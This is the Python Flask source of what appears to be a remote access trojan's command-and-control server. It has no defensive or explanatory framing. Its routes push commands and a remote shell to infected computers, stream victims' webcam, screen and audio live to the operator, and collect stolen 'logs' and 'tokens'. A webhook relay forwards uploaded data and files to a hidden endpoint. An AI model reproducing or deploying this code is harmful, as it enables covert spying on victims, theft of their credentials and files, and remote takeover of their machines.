import multiprocessing, cloudscraper, threading, hashlib, urllib3, zipfile, random, flask, json, time, os


scraper = cloudscraper.create_scraper()

while True:
    try:
        from flask import Flask, request, send_file, jsonify
        from flask_sock import Sock

        break
    except:
        os.system("pip install flask-sock")
        os.system("pip install flask-tor")


app = Flask(__name__)
sock = Sock(app)
command = {}

shell_commands = {}                
shell_response = {}

screen_recv_ws = {}
camera_recv_ws = {}
audio_recv_ws = {}

key = os.environ["key"]
connectedComputers = []

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(
                os.path.join(root, file),
                os.path.relpath(os.path.join(root, file), os.path.join(path, "..")),
            )


def ping(ws, computer):
    global connectedComputers
    tries = 5
    while True:
        time.sleep(1)
        try:
            tries -= 1
            ws.send("ping")
        except:
            if tries < 0:
                try:
                    connectedComputers.remove(computer)
                except:
                    pass
                try:
                    ws.close()
                except:
                    pass
                print("Bye!")
                break


@sock.route("/api/ws/commands")
def commands(ws):
    global connectedComputers
    global command

    print("User Connected")
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        print("Client provided invalid key")
        ws.close()

    while True:
        computer = ws.receive()
        if not "|" in computer:
            ws.send("getComputer")
        else:
            break

    print(computer)
    connectedComputers.append(computer)
    threading.Thread(target=ping, args=(ws, computer)).start()

    while True:

        if not command:
            continue

        if computer == command["target"]:
            if not computer in connectedComputers:
                connectedComputers.append(computer)

            ws.send(command["code"])
            command = {}


@sock.route("/api/ws/camera")
def wscamera(ws):
    global camera_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in camera_recv_ws:
      camera_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for _ws in camera_recv_ws[computer]:
            try:
                _ws.send(image)
            except:
                camera_recv_ws[computer].remove(_ws)


@sock.route("/api/ws/screen")
def wsscreen(ws):
    global screen_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in screen_recv_ws:
      screen_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for _ws in screen_recv_ws[computer]:
            try:
                _ws.send(image)
            except:
                screen_recv_ws[computer].remove(_ws)


@sock.route("/api/ws/audio")
def wsaudio(ws):
    global audio_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in audio_recv_ws:
      audio_recv_ws[computer] = []

    while True:
        image = ws.receive()
        for _ws in audio_recv_ws[computer]:
            try:
                _ws.send(image)
            except Exception as e:
                print(e, "e")
                audio_recv_ws[computer].remove(_ws)

@sock.route("/api/ws/showCamera")
def camera(ws):
    global camera_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        print("Client provided invalid key")
        ws.close()

    computer = ws.receive()

    if not computer in camera_recv_ws:
        camera_recv_ws[computer] = []

    camera_recv_ws[computer].append(ws)
    while True:
        try:
            ws.receive()
        except:
            camera_recv_ws[computer].remove(ws)
            return

@sock.route("/api/ws/showScreen")
def screen(ws):
    global screen_recv_ws
    data = ws.receive()

    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in screen_recv_ws:
      screen_recv_ws[computer] = []

    screen_recv_ws[computer].append(ws)
    while True:
        try:
            ws.receive()
        except:
            screen_recv_ws[computer].remove(ws)
            return


@sock.route("/api/ws/playAudio")
def audio(ws):
    global audio_recv_ws
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    if not encoded == key:
        ws.close()

    computer = ws.receive()

    if not computer in audio_recv_ws:
      audio_recv_ws[computer] = []

    if not computer in screen_recv_ws:
      screen_recv_ws[computer] = []

    audio_recv_ws[computer].append(ws)
    while True:
        try:
            ws.receive()
        except:
            audio_recv_ws[computer].remove(ws)
            return

def update(ws):
    global connectedComputers
    old = None
    while True:
        if not old == connectedComputers:
            old = connectedComputers[:]
        else:
            continue

        ws.send(json.dumps(connectedComputers))


@sock.route("/api/ws/computers")
def computers(ws):
    global connectedComputers
    global command
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print(encoded)
    if not encoded == key:
        ws.close()

    threading.Thread(target=update, args=(ws,)).start()
    while True:

        command = json.loads(ws.receive())
        print(command)


@sock.route("/api/ws/readShell")
def readshell(ws):
    global shell_response
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print(encoded)
    if not encoded == key:
        ws.close()

    computer = ws.receive()
    threading.Thread(
        target=listen,
        args=(
            ws,
            computer,
        ),
    ).start()
    while True:

        if computer in shell_response and shell_response[computer]:
            print(shell_response)
            ws.send(shell_response[computer])
            shell_response[computer] = None


def listen(ws, computer):
    global shell_commands
    while True:
        print('test')
        shell_commands[computer] = ws.receive()
        print(shell_commands)


def send(ws, computer):
    global shell_commands
    while True:
        if computer in shell_commands and shell_commands[computer]:
            ws.send(shell_commands[computer])
            shell_commands[computer] = None


@sock.route("/api/ws/shell")
def shell(ws):
    global shell_response
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print("SHELL")
    if not encoded == key:
        ws.close()

    computer = ws.receive()

    threading.Thread(
        target=send,
        args=(
            ws,
            computer,
        ),
    ).start()
    while True:
        shell_response[computer] = ws.receive()


@app.route("/webhook", methods=["POST", "GET"])
def webhook():  
    webhook = os.environ['webhook']


    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]

    if request.method == "GET":

        response = scraper.get(webhook)
        return {}, response.status_code

    elif request.method == "POST":
        data = request.form
        try:
            data = dict(request.get_json(force=True))
            is_json = True
        except Exception as e:
            data = dict(request.form)
            is_json = False

        try:
           files = dict(request.files)
        except Exception as e:
           files = {}

        if files:
          try:
              files = {key: (file.filename, file.read(), "application/octet-stream") for key, file in files.items()}
          except Exception as e:
              files = {}



        if is_json:
            response = scraper.post(webhook, json=data, files=files)
        else:
            response = scraper.post(webhook, data=data, files=files)

        return {}


@app.route("/logs", methods=["POST", "GET"])
def logs():
    try:
        request.form["key"]
    except:
        print("Client provided invalid key")
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        print("Client provided invalid key")
        return "", 404

    if request.method == "POST":
        log = request.files["file"]
        user = request.form["user"]
        ip = request.form["ip"]

        try:
            dir = f"logs/{user}-{ip}"
            log.save(dir)
        except Exception as e:
            print(e)

        return "", 404

    else:
        with zipfile.ZipFile("temp.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
            zipdir("logs/", zipf)

        data = open("temp.zip", "rb").read()

        return data


@app.route("/tokens", methods=["POST", "GET"])
def tokens():
    try:
        request.form["key"]
    except:
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404

    if request.method == "POST":
        keysFile = json.load(open("tokens.json", "rb"))
        token = request.form["token"]

        if token not in keysFile["keys"]:
          with open("tokens.json", "w+") as f:
              keys = keysFile["keys"]
              keys.append(token)
              keysFile["keys"] = keys
              json.dump(keysFile, f, indent=1)
              f.close()

        return "", 204

    elif request.method == "GET":
        keysFile = json.load(open("tokens.json", "r"))

        keys = keysFile["keys"]
        return keys


@app.errorhandler(404)
def page_not_found(e):
    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]
    print(ip)
    return "", 404


@app.errorhandler(500)
def error(e):
    print(e)
    return "", 404


@app.errorhandler(405)
def notallowed(e):
    print(e)
    return "", 404


@app.errorhandler(400)
def client_error(e):
    print(e, 400)
    return "", 404


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=8080)